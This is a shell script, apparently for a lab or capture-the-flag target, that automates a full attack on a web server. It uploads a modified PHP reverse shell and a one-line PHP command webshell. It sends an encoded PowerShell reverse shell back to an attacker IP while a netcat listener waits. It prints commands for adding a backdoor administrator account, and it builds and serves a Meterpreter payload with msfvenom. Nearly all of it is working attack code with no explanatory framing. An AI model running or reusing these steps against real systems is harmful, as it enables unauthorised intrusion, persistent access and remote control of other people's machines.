#/bin/sh

# Retrieve absolute path to this script
script=$(readlink -f $0)
scriptpath=`dirname $script`

# Define target IP ( the machine to attack ) and attack IP ( the machine which supports the attack )
target_ip="10.10.20.3"
attack_ip="10.9.5.12"
result_folder="/work/results/"

# Prepare environment
mkdir $result_folder 2>/dev/null

echo "1 - ENUMERATE"
#nmap --script vuln -sC -sV -p- -T4 ${target_ip} > $result_folder/nmap-windows-results.txt

echo "2 - UPLOAD AND EXECUTE KALI WEBSHELL"
cp /usr/share/webshells/php/php-reverse-shell.php /tmp/php-reverse-shell.php
sed -i 's/'127.0.0.1'/'$attack_ip'/g' "/tmp/php-reverse-shell.php"
sed -i 's/$port = 1234;/$port = 4444;/g' "/tmp/php-reverse-shell.php"
curl -s -X POST "http://$target_ip/" -L -F "upload=@/tmp/php-reverse-shell.php" -o /dev/null
#curl -s -X GET "http://$target_ip/uploads/php-reverse-shell.php" 
echo "--> Does not work because using daemon linux command"

echo "3 - UPLOAD AND EXECUTE BASIC WEBSHELL"
echo "<?php" > /tmp/webshell.php
echo "    system(\$_GET[\"cmd\"]);" >> /tmp/webshell.php
echo " ?>" >> /tmp/webshell.php
xterm -hold -e "nc -lvnp 4444" &
curl -s -X POST "http://$target_ip/" -L -F "upload=@/tmp/webshell.php" -o /dev/null
echo " Once the connexion is ready, enter :"
echo "net user test test1234 /add"
echo "net localgroup administrators test /add"
curl -s -X GET "http://$target_ip/uploads/webshell.php?cmd=powershell%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%27$attack_ip%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22" 

echo "5 - METERPRETER"
msfvenom -p windows/x64/meterpreter_reverse_tcp -LHOST=$attack_ip LPORT=4444 -f exe -o $result_folder/meterpreter.exe
python3 -m http.server 4444 -d $result_folder